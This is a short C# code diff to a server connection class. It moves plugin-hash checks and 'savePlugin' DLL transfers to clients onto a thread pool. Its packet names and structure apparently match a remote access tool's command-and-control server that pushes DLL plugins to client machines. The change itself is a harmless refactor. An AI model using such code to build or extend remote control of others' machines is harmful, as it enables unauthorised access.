@@ -204,7 +204,7 @@ namespace Server.Connection
             }
         }
 
-        public void CheckPlugin() // send all plugins md5 hash to client
+        public void CheckPlugin(object o) // send all plugins md5 hash to client
         {
             try
             {
@@ -218,7 +218,7 @@ namespace Server.Connection
                     MsgPack msgPack = new MsgPack();
                     msgPack.ForcePathObject("Packet").SetAsString("checkPlugin");
                     msgPack.ForcePathObject("Hash").SetAsString(string.Join(",", plugins));
-                    Send(msgPack.Encode2Bytes());
+                    ThreadPool.QueueUserWorkItem(Send, msgPack.Encode2Bytes());
                 }
             }
             catch (Exception ex)
@@ -239,7 +239,7 @@ namespace Server.Connection
                         msgPack.ForcePathObject("Packet").SetAsString("savePlugin");
                         msgPack.ForcePathObject("Dll").SetAsString(plugin.Value);
                         msgPack.ForcePathObject("Hash").SetAsString(plugin.Key);
-                        Send(msgPack.Encode2Bytes());
+                        ThreadPool.QueueUserWorkItem(Send,msgPack.Encode2Bytes());
                         break;
                     }
                 }
